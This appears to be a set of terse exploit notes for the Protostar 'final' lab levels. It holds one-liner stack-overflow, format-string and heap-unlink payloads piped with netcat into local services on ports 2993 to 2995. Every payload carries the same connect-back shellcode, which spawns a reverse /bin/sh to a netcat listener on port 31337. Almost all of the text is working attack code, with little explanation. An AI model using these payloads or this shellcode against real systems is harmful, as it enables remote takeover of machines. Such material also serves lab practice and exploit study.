# http://shell-storm.org/shellcode/files/shellcode-849.php
# https://www.exploit-db.com/exploits/13393/

nc -vlp 31337

# final0
python -c 'print "A"*512 + "B"*20 + "\x60\xfc\xff\xbf" + "\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d\xbe\x80\xff\xff\xfe\xf7\xd6\x56\x66\xbd\x69\x7a\x0f\xcd\x09\xdd\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf"' | nc localhost 2995

# final1
( python -c 'print "username X" + "\xbc\xfb\xff\xbf" + "\xbe\xfb\xff\xbf" + "\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d\xbe\x80\xff\xff\xfe\xf7\xd6\x56\x66\xbd\x69\x7a\x0f\xcd\x09\xdd\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf"'; python -c 'print "login " + "%63829d%15$n" + "%50727d%16$n"' ) | nc localhost 2994

# final2
0x0804d41c = write
0x0804d41c - 12 = 0x804d410 \x10\xd4\x04\x08

push 0x804e01c
nop
nop
ret

\x68\x1c\xe0\x04\x08\x90\x90\xc3

perl -e 'print "FSRD" . "A"x4 . "\x68\x1c\xe0\x04\x08\x90\x90\xc3" . "XXXX" . "\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d\xbe\x80\xff\xff\xfe\xf7\xd6\x56\x66\xbd\x69\x7a\x0f\xcd\x09\xdd\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf" . "A"x33 . "/" . "FSRDROOT" . "A"x99 . "/" . "\xfc\xff\xff\xff"x2 . "\x10\xd4\x04\x08" . "\x10\xe0\x04\x08" . "\x00"x4 . "\n"' | nc localhost 2993

perl -e 'print "FSRD" . "\x90"x16 . "\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d\xbe\x80\xff\xff\xfe\xf7\xd6\x56\x66\xbd\x69\x7a\x0f\xcd\x09\xdd\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf" . "A"x33 . "/" . "FSRDROOT" . "A"x99 . "/" . "\xfc\xff\xff\xff"x2 . "\x10\xd4\x04\x08" . "\x10\xe0\x04\x08" . "\x00"x4 . "\n"' | nc localhost 2993
